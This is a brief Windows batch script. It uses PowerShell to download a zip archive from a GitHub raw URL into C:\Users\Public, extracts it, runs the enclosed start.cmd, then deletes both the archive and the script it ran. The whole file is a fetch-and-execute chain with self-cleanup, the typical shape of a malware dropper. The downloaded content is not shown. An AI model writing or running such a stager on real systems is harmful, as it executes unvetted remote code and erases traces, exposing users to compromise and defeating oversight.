@echo off
cls

set "ZIP_PATH=C:\Users\Public\start.zip"
set "DESTINATION_FOLDER=C:\Users\Public"

powershell.exe -Command "Invoke-WebRequest -Uri 'https://github.com/ghostn4444/cmd_start/raw/main/start.zip' -OutFile '%ZIP_PATH%'"

powershell.exe -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%DESTINATION_FOLDER%'"

del "%ZIP_PATH%"

call "%DESTINATION_FOLDER%\start.cmd"

del "%DESTINATION_FOLDER%\start.cmd"

exit
